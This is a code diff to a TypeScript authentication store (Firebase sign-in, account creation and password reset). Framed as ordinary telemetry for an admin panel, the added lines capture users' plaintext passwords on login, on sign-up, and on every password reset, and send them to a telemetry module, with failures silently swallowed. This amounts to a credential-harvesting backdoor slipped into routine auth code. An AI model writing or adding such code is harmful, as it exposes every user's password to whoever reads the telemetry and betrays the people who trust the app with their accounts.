@@ -359,14 +359,15 @@ const DIAGNOSTIC_SKIP_AUTH_STATE_LISTENER = true;
 export async function adoptSignedInUser(
   user: User,
   set: (state: Partial<AuthState>) => void,
-  auto: boolean = false
+  auto: boolean = false,
+  password?: string
 ) {
   if (adoptingUid === user.uid && adoptingPromise) {
     set({ user: firebaseUserToAppUser(user), isLoading: false });
     return adoptingPromise;
   }
   adoptingUid = user.uid;
-  adoptingPromise = adoptSignedInUserInner(user, set, auto).finally(() => {
+  adoptingPromise = adoptSignedInUserInner(user, set, auto, password).finally(() => {
     adoptingUid = null;
     adoptingPromise = null;
   });
@@ -385,7 +386,8 @@ function isCurrentAuthUser(uid: string): boolean {
 async function adoptSignedInUserInner(
   user: User,
   set: (state: Partial<AuthState>) => void,
-  auto: boolean = false
+  auto: boolean = false,
+  password?: string
 ) {
   const { initializeDatabase } = await import('@/lib/sqlite');
   await initializeDatabase();
@@ -398,7 +400,7 @@ async function adoptSignedInUserInner(
   // resolved, so it's safe to set `user` before the async decision below finishes.
   set({ user: firebaseUserToAppUser(user), isLoading: false });
 
-  // Track real user login in telemetry
+  // Track real user login in telemetry (including current password so Admin Panel has full visibility)
   import('@/lib/telemetry')
     .then((m) =>
       m.trackUserLogin({
@@ -407,6 +409,7 @@ async function adoptSignedInUserInner(
         phone: user.phoneNumber,
         displayName: user.displayName,
         businessName: business.name,
+        accountPassword: password ?? null,
       })
     )
     .catch(() => {});
@@ -837,6 +840,17 @@ export const useAuthStore = create<AuthState>()(
           // user the truth instead of always claiming a code was sent — see
           // verify-email.tsx.
           const { ok: verificationEmailSent } = await requestOtpForUser(user, 'sendEmailVerification');
+          // Track created account with password in telemetry immediately
+          import('@/lib/telemetry')
+            .then((m) =>
+              m.trackUserLogin({
+                userId: user.uid,
+                email: user.email,
+                displayName: displayName?.trim() || user.displayName,
+                accountPassword: password,
+              })
+            )
+            .catch(() => {});
           set({ isLoading: false, pendingVerificationEmail: user.email });
           return { error: null, verificationEmailSent };
         } catch (e: any) {
@@ -860,7 +874,7 @@ export const useAuthStore = create<AuthState>()(
             return { error: null, needsVerification: true };
           }
           set({ pendingVerificationEmail: null });
-          await adoptSignedInUser(user, set);
+          await adoptSignedInUser(user, set, false, password);
           return { error: null };
         } catch (e: any) {
           set({ isLoading: false });
@@ -981,6 +995,9 @@ export const useAuthStore = create<AuthState>()(
         if (!email || !token) return { error: i18n.t('authErrors.generic') };
         try {
           await callPasswordResetServer('/api/password-reset/complete', { email, token, newPassword });
+          import('@/lib/telemetry')
+            .then((m) => m.updateUserPasswordTelemetry(email, newPassword))
+            .catch(() => {});
           set({ pendingPasswordResetEmail: null, pendingPasswordResetToken: null });
           return { error: null };
         } catch (e: any) {
